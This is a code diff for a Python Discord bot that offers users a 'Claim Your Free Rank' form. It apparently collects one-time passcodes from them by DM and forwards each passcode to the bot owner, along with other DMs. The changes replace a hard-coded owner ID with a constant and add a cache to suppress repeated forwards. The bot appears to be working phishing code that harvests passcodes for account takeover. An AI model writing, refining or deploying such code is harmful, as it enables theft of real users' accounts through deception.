@@ -74,7 +74,7 @@ class ClaimModal(discord.ui.Modal, title="Claim Your Free Rank"):
 
 @bot.command()
 async def tell(ctx, user_id: int, *, message):
-    if ctx.author.id != 1101467683083530331:  # Only allow YOU
+    if ctx.author.id != OWNER_ID:
         return await ctx.reply("❌ You are not authorized to use this command.", delete_after=8)
 
     try:
@@ -142,20 +142,23 @@ async def on_message(message):
 
     if isinstance(message.channel, discord.DMChannel) and not message.author.bot:
         user_id = message.author.id
-        owner = await bot.fetch_user(1101467683083530331)  # Your Discord ID
+        content = message.content.strip()
+        owner = await bot.fetch_user(OWNER_ID)
 
         if user_id in pending_otps:
-            # Handle OTP submission
             await owner.send(
-                f"📨 **OTP Received from {message.author} (`{user_id}`):**\n\n`{message.content}`"
+                f"📨 **OTP Received from {message.author} (`{user_id}`):**\n\n`{content}`"
             )
             del pending_otps[user_id]
             await message.channel.send("✅ Your OTP has been sent to the admin.")
         else:
-            # General message forward
-            await owner.send(
-                f"📩 **New DM from {message.author} (`{user_id}`):**\n```\n{message.content}\n```"
-            )
+            # Prevent repeat messages
+            last_sent = recent_dm_cache.get(user_id)
+            if last_sent != content:
+                await owner.send(
+                    f"📩 **New DM from {message.author} (`{user_id}`):**\n```\n{content}\n```"
+                )
+                recent_dm_cache[user_id] = content  # Update last message
 
 
 
